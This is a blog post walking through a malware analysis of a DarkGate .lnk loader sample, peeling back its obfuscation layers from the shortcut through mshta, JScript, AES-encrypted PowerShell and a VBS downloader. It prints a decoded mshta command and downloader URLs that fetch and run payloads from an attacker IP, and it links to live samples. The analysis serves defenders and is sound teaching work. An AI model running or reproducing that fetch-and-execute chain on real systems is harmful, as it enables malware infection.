<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unmasking DarkGate: 8 Deobfuscation Layers of 1040doc_pdf.lnk (Malware Analysis 2025) - Geetansh Cybersecurity</title>
    <meta name="description" content="Geetansh Aditya - Professional Cybersecurity Specialist | Reverse Engineering, DFIR, Penetration Testing, Exploit Development">
    <meta name="keywords" content="cybersecurity, reverse engineering, DFIR, penetration testing, exploit development, malware analysis">
    <link rel="icon" type="image/x-icon" href="../../assets/favicon.svg">
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Main stylesheet -->
    <link rel="stylesheet" href="../../assets/style.css">
</head>
<body>
    <header class="main-header">
        <nav class="navbar">
            <div class="nav-container">
                <a href="../../index.html" class="nav-brand">
                    <span class="brand-name">Geetansh Aditya</span>
                </a>
                
                <ul class="nav-menu">
                    <li class="nav-item">
                        <a href="../../index.html" class="nav-link">Home</a>
                    </li>
                    <li class="nav-item">
                        <a href="../../blogs.html" class="nav-link">Blogs</a>
                    </li>
                    <li class="nav-item">
                        <a href="../../writeups.html" class="nav-link">CTF Writeups</a>
                    </li>
                    <li class="nav-item">
                        <a href="../../services.html" class="nav-link">Services</a>
                    </li>
                    <li class="nav-item">
                        <a href="../../about.html" class="nav-link">About Me</a>
                    </li>
                    <li class="nav-item">
                        <a href="../../contact.html" class="nav-link">Contact</a>
                    </li>
                </ul>
                
                <div class="nav-toggle" id="mobile-menu">
                    <span class="bar"></span>
                    <span class="bar"></span>
                    <span class="bar"></span>
                </div>
            </div>
        </nav>
    </header>
    <div class="mobile-overlay" id="mobile-overlay"></div>

    
            <main class="content-page">
                <article class="blog-post">
                    <header class="post-header">
                        <h1>Unmasking DarkGate: 8 Deobfuscation Layers of 1040doc_pdf.lnk (Malware Analysis 2025)</h1>
                        <div class="post-meta">
                            <span class="date">2025-08-10</span>
                            <div class="tags">
                                <span class="tag">[DarkGate malware 2025, DarkGate LNK loader, DarkGate reverse engineering, DarkGate deobfuscation analysis]</span>
                            </div>
                        </div>
                    </header>
                    <div class="post-content">
                        <p>Malware analysis is a critical skill and involves examining the malicious software to understand its behavior, capabilities and potential impact. Using this analysis, we can strengthen the defenses we have. This blog shows how a malware evades the defensive mechanisms by multiple layers of obfuscation. </p>
<p>You can follow this blog step by step to dissect this malware and understand its mechanism.</p>
<p>Get your sample from Malware Bazaar: <a href="https://bazaar.abuse.ch/sample/ca388a52c69865829152ec89665ebdaa1b2a77dea74973352287c3a37fa1e206/">1040doc_pdf.lnk</a></p>
<h3 id="stage-0-detonate-and-capture-behavior-in-a-controlled-sandbox">Stage-0: Detonate and Capture behavior in a controlled sandbox</h3>
<p>Run the <code>1040doc_pdf.lnk</code> in a sandbox environment like FlareVM or any fully isolated VM with tools like <strong>Procmon, Wireshark</strong> and <strong>Process Hacker</strong> running. Also <strong>regshot</strong> for before and after system changes.</p>
<p>Goal right now : </p>
<ul>
<li>To understand what it drops or extracts.</li>
<li>Capture network traffic to see which IPs are connected and where it tries to connect.</li>
</ul>
<p>If you have learnt <strong>SOC Analysis</strong> then utilizing the logs can be beneficial for understanding what the malware does.</p>
<div class="success-box">Note: Regardless of the encryption methods utilized or how deeply it is obfuscated, at the time of running it has to decrypt itself in order to run.</div>

<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image.png" /></p>
<div class="danger-box">Warning: Make sure you run malware samples in an isolated VM and take snapshots to escape the trouble of installing it again.</div>

<p>To keep it isolated from the internet I used FakeNet by mandiant.</p>
<p><strong>Key findings:</strong> </p>
<ul>
<li>mshta.exe http://168[.]100[.]8[.]242/dc001/1040_document_pdf</li>
<li>Many more findings, but lets go through them one by one in static analysis</li>
</ul>
<p><em>Now its time to do some static analysis and deobfuscation.</em></p>
<h3 id="stage-1-static-analysis-and-info-gathering">Stage-1: Static Analysis and Info Gathering</h3>
<p>Using the tool, LECmd.exe from the <a href="https://ericzimmerman.github.io/#!index.md">Eric Zimmermen’s</a> tools we first try to gather the information on this <code>.lnk</code> file.</p>
<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%201.png" /></p>
<p>What’s happening : - </p>
<ul>
<li>The <code>.lnk</code> file calls the <code>SyncAppvPublishingServer.vbs (LOLBAS)</code>  with arguments.</li>
<li>Here, it maps each numbers and subtracts it by 557 and convert to character and make a string.</li>
<li>Finally the string is piped to powershell.exe</li>
</ul>
<p>So lets decode that. The simplest option is to use python to make that string and print it.</p>
<div class="highlight"><pre><span></span><code><span class="n">nums</span> <span class="o">=</span> <span class="p">[</span><span class="mi">666</span><span class="p">,</span><span class="mi">672</span><span class="p">,</span><span class="mi">661</span><span class="p">,</span><span class="mi">673</span><span class="p">,</span><span class="mi">654</span><span class="p">,</span><span class="mi">589</span><span class="p">,</span><span class="mi">661</span><span class="p">,</span><span class="mi">673</span><span class="p">,</span><span class="mi">673</span><span class="p">,</span><span class="mi">669</span><span class="p">,</span><span class="mi">615</span><span class="p">,</span><span class="mi">604</span><span class="p">,</span><span class="mi">604</span><span class="p">,</span><span class="mi">606</span><span class="p">,</span><span class="mi">611</span><span class="p">,</span><span class="mi">613</span><span class="p">,</span><span class="mi">603</span><span class="p">,</span><span class="mi">606</span><span class="p">,</span><span class="mi">605</span><span class="p">,</span><span class="mi">605</span><span class="p">,</span><span class="mi">603</span><span class="p">,</span><span class="mi">613</span><span class="p">,</span><span class="mi">603</span><span class="p">,</span><span class="mi">607</span><span class="p">,</span><span class="mi">609</span><span class="p">,</span><span class="mi">607</span><span class="p">,</span><span class="mi">604</span><span class="p">,</span><span class="mi">657</span><span class="p">,</span><span class="mi">656</span><span class="p">,</span><span class="mi">605</span><span class="p">,</span><span class="mi">605</span><span class="p">,</span><span class="mi">606</span><span class="p">,</span><span class="mi">604</span><span class="p">,</span><span class="mi">606</span><span class="p">,</span><span class="mi">605</span><span class="p">,</span><span class="mi">609</span><span class="p">,</span><span class="mi">605</span><span class="p">,</span><span class="mi">652</span><span class="p">,</span><span class="mi">657</span><span class="p">,</span><span class="mi">668</span><span class="p">,</span><span class="mi">656</span><span class="p">,</span><span class="mi">674</span><span class="p">,</span><span class="mi">666</span><span class="p">,</span><span class="mi">658</span><span class="p">,</span><span class="mi">667</span><span class="p">,</span><span class="mi">673</span><span class="p">,</span><span class="mi">652</span><span class="p">,</span><span class="mi">669</span><span class="p">,</span><span class="mi">657</span><span class="p">,</span><span class="mi">659</span><span class="p">]</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">557</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">nums</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
</code></pre></div>

<p>On running the script we got : - </p>
<div class="highlight"><pre><span></span><code><span class="n">mshta</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">168</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">100</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">8</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">242</span><span class="o">/</span><span class="n">dc001</span><span class="o">/</span><span class="mi">1040</span><span class="n">_document_pdf</span>
</code></pre></div>

<p>This technique aligns with MITRE ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1216/002/">T1216.002</a></p>
<h3 id="stage-2-extracting-embedded-jscript">Stage-2: Extracting Embedded JScript</h3>
<p>I downloaded the 2nd file from <a href="https://app.any.run/tasks/ddadd333-2ec9-45bd-8b01-4a0717a61f74">ANY.RUN</a>. Either download from there or use your OSINT skills to find the next one. Yes, Malware Bazaar also have the other files.</p>
<p>We are now at the stage2 which is 1040_document_pdf file. I just renamed it to <strong>stage2</strong> for convenience.<br />
This technique aligns with MITRE ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1218/005/">T1218.005</a><br />
After some trial and error I found out the following.</p>
<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%202.png" /></p>
<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%203.png" /></p>
<p>So there are files embedded in it. Lets try to string things out. I found this, it looks like .HTA file from the opening tag. And then there was this <code>&lt;script&gt;</code>  tag. So I copied the entire script tags and pasted it in the browser. This code is our stage3</p>
<h3 id="stage-3-powershell-payload-extraction">Stage-3: Powershell Payload Extraction</h3>
<p>In this stage3, the <code>javascript</code> code had many variables like <strong>fc, F0</strong> but after seeing closely you will find the one interesting <code>dNT</code> . Print that variable using browser’s console and copy the output. Make sure to just paste the string, not execute it live.</p>
<p>Then print the <code>dNT</code> variable. It contains another javascript code. So lets say another obfuscation.</p>
<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%204.png" /></p>
<p>This code had another code in <code>xhY</code> variable and the name for the file in the <code>SxS</code>variable. Then it was going to save and run it. I remove the running part and just got the output of those two variables.</p>
<p>Key findings:</p>
<ul>
<li>Another Obfuscated Powershell code which ran on the system</li>
<li>Filename as WScript.Shell</li>
</ul>
<h3 id="stage-4-powershell-deobfuscation-level-1">Stage-4: Powershell Deobfuscation Level 1</h3>
<p>In the stage4, we have the powershell code which is AES encrypted. I tweaked the code to print the output instead of directly running the encrypted code. So that way we get the decrypted powershell code.</p>
<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%205.png" /></p>
<p>After printing the output we get another powershell code as follows : - </p>
<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%206.png" /></p>
<p>So I will save the above output as Stage5</p>
<div class="info-box">Pro Tip: Using Dynamic Analysis saves time, but if you want to understand the process of the obfuscation use tools like CyberChef.</div>

<h3 id="stage-5-powershell-deobfuscation-level-2">Stage-5: Powershell Deobfuscation Level 2</h3>
<p>Here I read the code, made it look readable from oneline. Then tried to understand the logic which was pretty simple.</p>
<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%207.png" /></p>
<p>The code is basically downloading and storing files : - </p>
<div class="highlight"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">168</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">100</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">8</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">242</span><span class="o">/</span><span class="n">dc001</span><span class="o">/</span><span class="mi">1040</span><span class="n">documentpdf</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">168</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">100</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">8</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="mi">242</span><span class="o">/</span><span class="n">dc001</span><span class="o">/</span><span class="n">AdityaAReturn2020</span><span class="o">.</span><span class="n">pdf</span>
</code></pre></div>

<p>Then it saves it in the <code>C:\Users\{Username}\AppData\Roaming\</code> then executes it.</p>
<p>This stage functions as a downloader, fetching the next payloads.</p>
<p>Now we need the <code>1040documentpdf.vbs</code>  file for the 6th Stage.</p>
<p>This stage and the upcoming aligns with MITRE ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1105/">T1105</a></p>
<p>You can download from here: <a href="https://bazaar.abuse.ch/sample/4d86f191c4d7a5684116b671618669ec2bdd6bc08337fa2573c773386a14b2df/">Link</a></p>
<h3 id="stage-6-understanding-vbs-script-usage">Stage-6: Understanding VBS script usage</h3>
<p>After downloading the <code>.vbs</code> script open it. Get rid of the obfuscation filler constants and focus of what the script is doing.</p>
<p><img alt="image.png" src="DarkGate%20250d0bcb44a8803ba486e1d19bd80361/image%208.png" /></p>
<p>The above code shows that its downloading yet another file which is named as <strong>ivpzhehw</strong> from the ip different than before.</p>
<p>At this stage, I tried to find out the next files online. However, I couldn’t find any of those anywhere. I don’t have the VirusTotal Enterprise so the download option was a no go. I could have easily dissected the next layers as well but as we lack the resource, so its a no go for us.</p>
<div class="note-box">Analysis will not always yield every file, but the process of peeling away layers is what builds true reverse engineering skill.</div>
<hr />
<h2 id="conclusion">Conclusion</h2>
<p>DarkGate is a very slippery malware, with multiple layers of obfuscation and very high stealth. I came across a post of X by <code>@polygonben</code> and he has done the same things I have done. But an year ago and he got those files from some sources I suppose. You can check the post from <a href="https://x.com/polygonben/status/1768867698845307223">here</a>. There he mentioned the 8+ stages of obfuscation. However, he hasn’t completed the analysis of it as well.<br />
DarkGate demonstrates how modern malware leverages multiple layers of obfuscation and LOLBins to evade defenses. In this analysis, we observed a chain from .lnk execution to script-based obfuscation, mshta abuse, and staged downloaders. While the campaign infrastructure is no longer active and later payloads were inaccessible, the deobfuscation journey itself provides valuable lessons for defenders. Understanding these techniques helps us build detection rules (YARA, Sigma) and strengthen SOC triage workflows.</p>
<hr />
<h2 id="authors-note">Author’s Note</h2>
<p>I’m Geetansh Aditya — a reverse engineer with hands-on experience in malware analysis, penetration testing, and DFIR. My focus is on dissecting modern threats and exposing the tactics attackers use to evade defenses.  </p>
<p>If you’d like to connect, collaborate, or discuss research:<br />
- 🌐 <a href="https://linkedin.com/in/geetansh-aditya">LinkedIn</a><br />
- 📩 Contact me through my website  </p>
<p><em>I don’t just stop at reversing binaries — I work across the spectrum of cybersecurity, from red teaming to blue team forensics.</em>  </p>
<p><strong>Happy Reversing and Happy Hacking!!!</strong></p>
<div class="info-box">Malware Analysis in itself isn’t tough. You need to have a knack for keep going. The better you are able to understand the nature of the threat actors the more easily you can dissect their malware.</div>
                    </div>
                </article>
                <nav class="post-navigation">
                    <a href="../../blogs.html" class="back-link">← Back to Blogs</a>
                </nav>
            </main>
            

    <footer class="main-footer">
        <div class="footer-container">
            <div class="footer-content">
                <div class="footer-section">
                    <h3>Geetansh Aditya</h3>
                    <p>Professional Cybersecurity Specialist</p>
                    <div class="social-links">
                        <a href="https://github.com/RootUser-GeetanshAditya/" aria-label="GitHub" target="_blank"><i class="fab fa-github"></i></a>
                        <a href="https://www.linkedin.com/in/geetansh-aditya/" aria-label="LinkedIn" target="_blank"><i class="fab fa-linkedin"></i></a>
                        <a href="https://x.com/Geetansh_Aditya" aria-label="Twitter" target="_blank"><i class="fab fa-twitter"></i></a>
                        <a href="mailto:geetanshaditya2005@gmail.com" aria-label="Email" target="_blank"><i class="fas fa-envelope"></i></a>
                    </div>
                </div>
                
                <div class="footer-section">
                    <h4>Services</h4>
                    <ul>
                        <li><a href="../../services.html">Penetration Testing</a></li>
                        <li><a href="../../services.html">Incident Response</a></li>
                        <li><a href="../../services.html">Malware Analysis</a></li>
                        <li><a href="../../services.html">Reverse Engineering</a></li>
                    </ul>
                </div>
                
                <div class="footer-section">
                    <h4>Resources</h4>
                    <ul>
                        <li><a href="../../blogs.html">Blog Posts</a></li>
                        <li><a href="../../writeups.html">CTF Writeups</a></li>
                        <li><a href="../../about.html">About</a></li>
                        <li><a href="../../contact.html">Contact</a></li>
                    </ul>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; 2025 Geetansh Aditya. All rights reserved.</p>
            </div>
        </div>
    </footer>

        <script>
        // Mobile navigation toggle
        document.addEventListener('DOMContentLoaded', function() {
            const mobileMenu = document.getElementById('mobile-menu');
            const navMenu = document.querySelector('.nav-menu');
            const mobileOverlay = document.getElementById('mobile-overlay');
            const body = document.body;

            function toggleMobileMenu() {
                mobileMenu.classList.toggle('active');
                navMenu.classList.toggle('active');
                mobileOverlay.classList.toggle('active');
                body.style.overflow = navMenu.classList.contains('active') ? 'hidden' : '';
            }

            function closeMobileMenu() {
                mobileMenu.classList.remove('active');
                navMenu.classList.remove('active');
                mobileOverlay.classList.remove('active');
                body.style.overflow = '';
            }

            if (mobileMenu && navMenu && mobileOverlay) {
                // Toggle menu when clicking hamburger
                mobileMenu.addEventListener('click', function(e) {
                    e.stopPropagation();
                    toggleMobileMenu();
                });

                // Close menu when clicking overlay
                mobileOverlay.addEventListener('click', closeMobileMenu);

                // Close mobile menu when clicking on nav links
                const navLinks = document.querySelectorAll('.nav-link');
                navLinks.forEach(link => {
                    link.addEventListener('click', closeMobileMenu);
                });

                // Close menu on escape key
                document.addEventListener('keydown', function(e) {
                    if (e.key === 'Escape' && navMenu.classList.contains('active')) {
                        closeMobileMenu();
                    }
                });
            }
        });
    </script>
    <div class="image-overlay" id="imageOverlay">
    <img id="overlayImg" src="" alt="Zoomed Image">
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const overlay = document.getElementById('imageOverlay');
    const overlayImg = document.getElementById('overlayImg');

    document.querySelectorAll('.post-content img').forEach(img => {
        img.addEventListener('click', () => {
            overlayImg.src = img.src;
            overlay.style.display = 'flex';
        });
    });

    overlay.addEventListener('click', () => {
        overlay.style.display = 'none';
        overlayImg.src = '';
    });
});
</script>


</body>
</html>
